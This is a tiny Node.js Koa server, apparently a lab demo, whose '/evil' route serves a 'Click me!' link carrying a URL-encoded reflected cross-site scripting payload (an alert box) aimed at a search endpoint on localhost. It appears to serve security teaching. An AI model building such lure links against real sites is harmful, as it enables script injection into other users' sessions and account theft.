const Koa = require('koa');
const Router = require('koa-router');
const bodyParser  = require('koa-bodyparser');

const app = new Koa();
const router = new Router();

app.use(bodyParser());
app.use(router.routes());

router.get('/evil', ctx => {
    ctx.body = `<a href="http://localhost:4000/query?search=%3Cscript%3Ealert%28%27HACKED%21%27%29%3C%2Fscript%3E">Click me!</a>`
});

app.listen(4001, () => {
    console.log('Listening...');
});
